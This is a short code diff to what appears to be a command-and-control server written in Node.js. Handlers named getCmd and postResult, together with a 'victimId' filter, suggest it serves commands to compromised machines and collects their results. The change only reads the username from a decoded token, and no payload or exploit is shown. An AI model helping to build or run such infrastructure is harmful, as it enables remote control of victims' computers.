@@ -44,7 +44,7 @@ async function initialHandshake(req, res) {
 }
 
 async function getCmd(req, res) {
-	const username = req.username;
+	const username = req.decoded['username'];
 
 	const filterVictim = { victimId: username }; // desired filter criteria
 
@@ -69,7 +69,7 @@ async function getCmd(req, res) {
 }
 
 async function postResult(req, res) {
-	const username = req.username;
+	const username = req.decoded['username'];
 
 	const { result, commandId } = req.body;
 
